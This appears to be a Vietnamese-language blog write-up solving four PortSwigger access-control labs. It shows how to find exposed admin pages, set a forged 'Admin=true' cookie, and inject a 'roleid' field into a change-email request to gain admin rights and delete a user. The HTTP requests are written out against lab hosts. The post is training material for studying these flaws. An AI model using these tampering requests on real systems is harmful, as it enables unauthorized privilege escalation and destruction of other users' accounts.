---
title: "[PortSwigger Lab] - Access Control Vulneralbilities"
description: Solution of Access Control Vulneralbilities on PortSwigger Lab
date: 2025-06-08 10:27:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, access control]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-08-portswigger-lab-access-control-vulneralbilities/access-control.png
    alt: Access Control Vulneralbilities
---

## Introduction
---
### Access control
**Access control** là cơ chế kiểm soát việc ai hoặc cái gì được phép thực hiện hành động hoặc truy cập vào tài nguyên nào đó. Trong lĩnh vực **web application**, **access control** liên quan chặt chẽ đến:
1. **Authentication (Xác thực):** Xác minh danh tính người dùng — người dùng có đúng là người họ khai báo không?
Ví dụ: đăng nhập bằng username và password.

2. **Session management (Quản lý phiên):** Gắn các request HTTP sau đó với cùng một người dùng đã đăng nhập.
Ví dụ: dùng cookie hoặc token để theo dõi người dùng giữa các lần truy cập.

3. **Access control (Kiểm soát truy cập):** Quyết định người dùng đó có được phép thực hiện hành động cụ thể không.
Ví dụ: người dùng bình thường không được phép xóa tài khoản người khác.

### Type of **access control**

| Loại kiểm soát        | Dựa vào                        | Mục tiêu                              | Ví dụ                             |
| --------------------- | ------------------------------ | ------------------------------------- | --------------------------------- |
| **Vertical**          | Vai trò / cấp bậc              | Phân quyền chức năng                  | Admin vs user                     |
| **Horizontal**        | Danh tính người dùng           | Bảo vệ dữ liệu cá nhân                | User chỉ xem dữ liệu của mình     |
| **Context-dependent** | Trạng thái ứng dụng/người dùng | Bảo vệ logic hoạt động đúng quy trình | Không sửa giỏ hàng sau thanh toán |

## Solve Access Control Vulneralbilities Lab
---
### Lab: Unprotected admin functionality
#### Analysis
- Để tìm được trang admin, ta không thể mò từng cái một được, thông thường sẽ sử dụng tool để tự động hóa quá trình tìm kiếm, ví dụ: **ffuf**, **dirsearch**,...
- Nhiều lập trình viên muốn ngăn **Google** hoặc **Bing** thu thập các trang quản trị, nên đã thêm `Disallow: /administrator-panel` vào `robots.txt`, để hướng dẫn các công cụ tìm kiếm (**crawlers**) như **Googlebot** biết những phần nào không nên thu thập (**index**)

#### Exploit
- Thử truy cập vào `robots.txt` ta thấy được trang admin đã **Disallow**
```
User-agent: *
Disallow: /administrator-panel
```
- Truy cập vào `/administrator-panel` và xóa người dùng `Carlos` 

### Lab: Unprotected admin functionality with unpredictable URL
#### Analysis
- Ở lab này, ứng dụng sử dụng trang admin với kí tự khó đoán, người dùng thông thường sẽ không thấy được
- Nhưng trong source code lại để lộ đường dẫn đến trang admin
#### Exploit
- Inspect code, ta thấy script:
```html
<script>
    var isAdmin = false;
    if (isAdmin) {
        var topLinksTag = document.getElementsByClassName("top-links")[0];
        var adminPanelTag = document.createElement('a');
        adminPanelTag.setAttribute('href', '/admin-4393rt');
        adminPanelTag.innerText = 'Admin panel';
        topLinksTag.append(adminPanelTag);
        var pTag = document.createElement('p');
        pTag.innerText = '|';
        topLinksTag.appendChild(pTag);
    }
</script>
```
- Nếu là admin thì người dùng sẽ tạo thẻ `<a>` liên kết tới trang `/admin-4393rt`
- Truy cập trang `/admin-4393rt` và xóa người dùng `Carlos`

### Lab: User role controlled by request parameter
- Login bằng tài khoản được cấp
- Truy cập tới trang `/admin`, nhận được thông báo:
```
Admin interface only available if logged in as an administrator
```
- Đến **Proxy** > **HTTP History** của **Burp**, tìm đến request `/admin`, nhận thấy có cookie `Admin=false`, gửi lại request với cookie `Admin=true`
- Xóa người dùng carlos bằng cách gửi request:
```http
GET /admin/delete?username=carlos HTTP/2
Host: 0af0007f0345662680b5b23d00680095.web-security-academy.net
Cookie: Admin=true; session=i61bXzmGjYejl2K5qgcEC8zl6zoRXA0o
```

### Lab: User role can be modified in user profile
#### Analysis
- Login bằng tài khoản được cấp
- Truy cập tới trang `/admin`, nhận được thông báo:
```
Admin interface only available if logged in as an administrator
```
- Thực hiện chức năng `change-email`, đến **Proxy** > **HTTP History** của **Burp**, quan sát **request** và **response**
    - Request:
    ```http
    POST /my-account/change-email HTTP/2
    Host: 0af900d704e013408300739300a10014.web-security-academy.net
    ...
    
    {"email":"a@gmail.com"}
    ```
    - Response:
    ```http
    HTTP/2 302 Found
    Location: /my-account
    Content-Type: application/json; charset=utf-8
    X-Frame-Options: SAMEORIGIN
    Content-Length: 115

    {
    "username": "wiener",
    "email": "a@gmail.com",
    "apikey": "tO9vzcxnFYMqYOk95INOTnWMT5sKti5X",
    "roleid": 1
    }
    ```

- Quan sát file `/resources/js/changeEmail.js`
```js
function jsonSubmit(formElement, e, changeEmailPath) {
    e.preventDefault();
    var object = {};
    var formData = new FormData(formElement);
    formData.forEach((value, key) => object[key] = value);
    var jsonData = JSON.stringify(object);
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", changeEmailPath, true);
    postRequest.withCredentials = true;
    postRequest.onload = function() {
        if (object["email"]) {
            window.location = postRequest.responseURL;
        }
    }
    postRequest.send(jsonData);
}
```
- Gửi dữ liệu của form dưới dạng `JSON` qua `AJAX` 
- Mặc định chỉ có **email** được gửi
#### Exploit
- Thay đổi `roleid` và gửi trong request `change-email` để trở thành vai trò `admin`
- Gửi request với `roleid` là 2
```http
POST /my-account/change-email HTTP/2
Host: 0af900d704e013408300739300a10014.web-security-academy.net
...

{
    "email":"a@gmail.com",
    "roleid": 2
}
```
- Trở lại trang `/admin` và xóa người dùng `carlos`


### 


---
Goodluck! 🍀🍀🍀 
